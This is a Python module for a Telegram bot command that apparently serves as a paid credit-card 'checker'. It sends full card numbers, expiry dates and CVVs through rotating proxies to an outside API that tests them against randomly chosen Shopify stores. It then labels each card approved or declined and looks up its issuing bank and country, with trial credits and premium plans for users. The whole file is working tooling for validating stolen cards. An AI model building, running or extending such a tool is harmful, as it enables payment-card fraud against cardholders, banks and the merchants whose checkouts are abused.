import aiohttp
import asyncio
import time
import re
import json
import random
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🛒 SHOPIFY API CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SHOPII_API_BASE = "https://goshopi.up.railway.app/shopii"
REQUEST_TIMEOUT  = 90   # seconds — long enough for real site checks

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITES & PROXY LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def load_sites():
    try:
        with open("sites.txt", "r") as f:
            sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        if sites:
            return sites
    except FileNotFoundError:
        pass
    return ["1898-products.myshopify.com", "anotherseasonwaco.myshopify.com"]

def load_proxies():
    try:
        with open("px.txt", "r") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        return []

SITES   = load_sites()
PROXIES = load_proxies()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# USER DATA HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    uid = str(user_id)
    if "user_data" not in context.bot_data:
        context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {
            "name": "User", "credits": 150, "plan": "TRIAL",
            "expires": 0, "pre_premium_credits": 0
        }
    return context.bot_data["user_data"][uid]

def is_user_premium(ud: dict) -> bool:
    raw_plan = ud.get("plan", "TRIAL").upper()
    if raw_plan == "TRIAL":
        return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"] = "TRIAL"
        ud["credits"] = ud.get("pre_premium_credits", 150)
        ud["expires"] = 0
        return False
    return True

def get_styled_plan(raw_plan: str) -> str:
    p = raw_plan.upper()
    if p == "CORE":   return "✨ Cᴏʀᴇ ✨"
    if p == "ELITE":  return "⭐ Eʟɪᴛᴇ ⭐"
    if p == "ROOT":   return "👑 Rᴏᴏᴛ 👑"
    return "Tʀɪᴀʟ"

async def _check_force_sub(user_id: int, context) -> list:
    if user_id == OWNER_ID:
        return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left", "kicked"):
                not_joined.append((name, link))
        except Exception:
            pass
    return not_joined

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL — hits real site, returns real response
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def call_shopii_api(cc: str, month: str, year: str, cvv: str,
                          site: str, proxy: str | None) -> str:
    """
    Makes the real HTTP request to goshopi API.
    Returns the raw response string exactly as the API sent it.
    Raises on timeout or connection error (caller handles these).
    """
    if len(year) == 2:
        year = "20" + year

    params = {"cc": f"{cc}|{month}|{year}|{cvv}", "site": site}
    if proxy:
        params["proxy"] = proxy

    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36"
    }

    async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
        async with session.get(SHOPII_API_BASE, params=params) as resp:
            raw_text = await resp.text()
            try:
                parsed = json.loads(raw_text)
                return json.dumps(parsed, ensure_ascii=False)
            except Exception:
                return raw_text.strip()


def classify_status(raw_text: str) -> str:
    """
    Returns "APPROVED", "DECLINED", or "UNKNOWN".
    Never assumes — only reads what the API actually said.
    """
    t = raw_text.lower()

    approve_kw = [
        "approved", "approval", "success", "charged", "captured",
        "transaction approved", "payment approved", "paid"
    ]
    decline_kw = [
        "declined", "decline", "card declined", "failed", "failure",
        "insufficient", "do not honor", "invalid card", "expired",
        "incorrect cvc", "stolen", "blocked", "do_not_honor",
        "card_declined", "generic_decline"
    ]

    for kw in approve_kw:
        if kw in t:
            return "APPROVED"
    for kw in decline_kw:
        if kw in t:
            return "DECLINED"

    return "UNKNOWN"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
        return

    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text(
            "⚠️ Sʜᴏᴘɪꜰʏ gate is currently <b>OFF</b>.", parse_mode="HTML"
        )
        return

    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n"
            "━━━━━━━━━━━━━━━━━\n"
            "Join our channel & group to use this bot.\n"
            "━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(rows),
            parse_mode="HTML"
        )
        return

    # ── Parse card ──
    card_str = None
    if context.args:
        card_str = context.args[0].strip()
    elif update.message.reply_to_message:
        replied_text = (
            update.message.reply_to_message.text
            or update.message.reply_to_message.caption
            or ""
        )
        match = re.search(
            r'(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})',
            replied_text
        )
        if match:
            card_str = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
        else:
            m2 = re.search(r'\b(\d{13,19})\b', replied_text)
            if m2:
                card_str = m2.group(1)

    if not card_str:
        await update.message.reply_text(
            "⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/sh cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>",
            parse_mode="HTML"
        )
        return

    parts = card_str.split("|")
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML"
        )
        return

    cc_num, mm, yy, cvv = [p.strip() for p in parts]

    # ── Credits check ──
    ud      = get_user_data(user.id, context)
    premium = is_user_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n"
                "━━━━━━━━━━━━━━━━━\n"
                "You have no credits left.\n"
                "Redeem a code with /rm or buy a plan.\n"
                "━━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
                    [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)]
                ])
            )
            return
        ud["credits"] -= 1

    site_used = random.choice(SITES)
    proxy     = random.choice(PROXIES) if PROXIES else None

    msg = await update.message.reply_text(
        f"⏳ <b>[ 𖥷iТ ] ➺ Cʜᴇᴄᴋɪɴɢ Sʜᴏᴘɪꜰʏ...</b>\n"
        f"<code>🌐 {escape(site_used)}</code>",
        parse_mode="HTML"
    )
    start_time = time.time()
    bin_num    = cc_num[:6]

    try:
        # Run real API call and BIN lookup at the same time
        api_task = asyncio.create_task(
            call_shopii_api(cc_num, mm, yy, cvv, site_used, proxy)
        )
        bin_task = asyncio.create_task(get_bin_info(bin_num))

        raw_response = await api_task   # full real API response
        bin_data     = await bin_task

        # Status from real response only — never assumed
        status = classify_status(raw_response)

        if status == "APPROVED":
            status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅"
        elif status == "DECLINED":
            status_ui = "Dᴇᴄʟɪɴᴇᴅ ❌"
        else:
            status_ui = "Uɴᴋɴᴏᴡɴ ⚠️"

        # ── BIN info ──
        bin_txt = "N/A"
        country = "N/A"
        flag    = ""
        if not bin_data.get("error"):
            s       = str(bin_data.get("scheme",  "N/A")).upper()
            t       = str(bin_data.get("type",    "N/A")).upper()
            b       = bin_data.get("bank", "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag    = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {t} - {b}"

        time_taken = f"{time.time() - start_time:.2f}"
        plan_ui    = get_styled_plan(ud.get("plan", "TRIAL").upper())
        username   = user.first_name or "User"
        safe_resp  = escape(raw_response)
        safe_proxy = escape(proxy if proxy else "None")

        text = (
            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
            f"🔍 ➺ <code>{escape(card_str)}</code>\n"
            f"Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 🛒 🟢\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🌐 𝗦𝗜𝗧𝗘  ➺ {escape(site_used)}\n"
            f"🔒 𝗣𝗥𝗢𝗫𝗬 ➺ {safe_proxy}\n"
            f"📜 𝗥𝗘𝗦𝗣  ➺ {safe_resp}\n"
            f"⏱️ 𝗧𝗜𝗠𝗘  ➺ {time_taken}s\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🏦 𝗕𝗜𝗡    ➺ {bin_txt}\n"
            f"🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➺ {flag} {country}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🦇 𝗨𝘀𝗲𝗿  ➺ {escape(username)} ({plan_ui})\n"
            f"📢 @Batcardchk"
        )

        await msg.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=kb_result(premium),
            disable_web_page_preview=True
        )

    except asyncio.TimeoutError:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            "<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n"
            "━━━━━━━━━━━━━━━━━\n"
            "The site took too long to respond. Try again or use a different site.\n"
            "━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )

    except aiohttp.ClientError as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            f"<b>[ 𖥷iТ ] ➺ Cᴏɴɴᴇᴄᴛɪᴏɴ Eʀʀᴏʀ ❌</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<code>{escape(str(e)[:200])}</code>\n"
            f"━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )

    except Exception as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            f"<b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<code>{escape(str(e)[:200])}</code>\n"
            f"━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )


def get_sh_handler():
    return CommandHandler("sh", cmd_sh)
